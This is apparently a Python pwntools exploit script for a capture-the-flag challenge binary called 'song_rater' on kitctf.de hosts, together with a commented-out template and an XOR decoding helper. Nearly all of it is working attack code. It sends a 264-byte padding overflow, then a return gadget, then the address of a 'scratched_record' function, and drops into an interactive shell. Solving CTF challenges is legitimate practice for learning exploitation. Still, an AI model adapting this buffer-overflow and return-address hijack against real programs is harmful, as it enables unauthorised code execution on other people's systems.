# #!/usr/bin/python3
# from pwn import *

# # =========================================================
# #                          SETUP                         
# # =========================================================
# exe = './song_rater' # <-- change this
# elf = context.binary = ELF(exe, checksec=True)
# libc = '/usr/lib/libc.so.6'
# libc = ELF(libc, checksec=False)
# context.log_level = 'debug'
# context.terminal = ["tmux", "splitw", "-h"]
# host, port = 'in-the-shadows--the-rasmus-3933.ctf.kitctf.de', 443 # <-- change this

# def initialize(argv=[]):
#     if args.GDB:
#         return gdb.debug([exe] + argv, gdbscript=gdbscript)
#     elif args.REMOTE:
        # return remote(host, port, ssl=True)
#     else:
#         return process([exe] + argv)

# gdbscript = '''
# init-pwndbg
# '''.format(**locals())


# # =========================================================
# #                         NOTES
# # =========================================================




# # =========================================================
# #                         EXPLOITS
# # =========================================================
# def exploit():
#     global io
#     io = initialize()
#     rop = ROP(exe)

#     offset = 264
#     payload = flat({
#         offset: [
#             elf.sym['scratched_record']
#         ]
#     })

#     io.sendlineafter(b':\n', payload)
#     io.interactive()
    
# if __name__ == '__main__':
#     exploit()

# def decode_xor(data_hex):
#     data_bytes = bytes.fromhex(data_hex)
#     result = bytearray([data_bytes[0]])  # The first byte is used as is
    
#     # Decode the rest of the bytes
#     for i in range(1, len(data_bytes)):
#         decoded_byte = data_bytes[i] ^ result[i-1]
#         result.append(decoded_byte)
    
#     return result.decode('utf-8')

# # Encoded data from the user
# encoded_data = "4717591a4e08732410215579264e7e0956320367384171045b28187402316e1a7243300f501946325a6a1f7810643b0a7e21566257083c63043404603f5763563e43"
# decoded_message = decode_xor(encoded_data)
# print(decoded_message)

from pwn import *

host = 'final-song--mo-5235.ctf.kitctf.de'
port = 443
songrater = context.binary = ELF('./song_rater')

context.update(terminal=['tmux', 'new-window'], os='linux', arch='amd64')

# connection = remote(host, port)
connection = process('./song_rater')

getshell = songrater.symbols.scratched_record
log.info(f"Address of scratched_record: {hex(getshell)}")

payload = b"A" * 264
payload += b"\x96\x11\x40\x00\x00\x00\x00\x00"
payload += p64(getshell)
print(p64(getshell))

connection.sendline(payload)
connection.interactive()